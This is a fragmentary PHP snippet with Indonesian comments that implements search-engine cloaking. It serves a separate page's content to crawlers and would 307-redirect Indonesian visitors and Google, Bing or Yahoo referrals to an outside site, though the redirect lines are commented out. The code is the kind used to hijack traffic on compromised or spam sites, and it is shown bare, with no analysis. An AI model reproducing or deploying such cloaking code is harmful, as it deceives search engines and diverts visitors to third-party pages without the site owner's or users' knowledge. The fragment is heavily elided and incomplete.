...
$bot_url = "https://ns1-static.net/clock/aatmea/wawaw.html";
$reff_url = "https://nightangle.online/Kapanlagi/";
...
// JIKA BOT → tampilkan content asli bot_url
...
// JIKA BLOCK COUNTRY / FINGERPRINT → redirect
if ($cc === "ID" || $fingerprint === "known_bad_fingerprint") {
    // usleep(rand(75000, 200000));
    // http_response_code(307);
    // header("Location: $reff_url"); // Redirect dimatikane
    // ob_end_flush();
    // exit();
}

// JIKA DARI GOOGLE / BING
// BAGIAN INI JUGA DIMATIKAN AGAR TIDAK REDIRECT
if (!empty($rf) && (
    stripos($rf, "yahoo.co.id") !== false || 
    stripos($rf, "google.com") !== false || 
    stripos($rf, "google.co.id") !== false || 
    stripos($rf, "bing.com") !== false
)) {
    // usleep(rand(100000, 250000));
    // http_response_code(307);
    // header("Location: $reff_url"); // Redirect dimatikan
    // ob_end_flush();
    // exit();
}
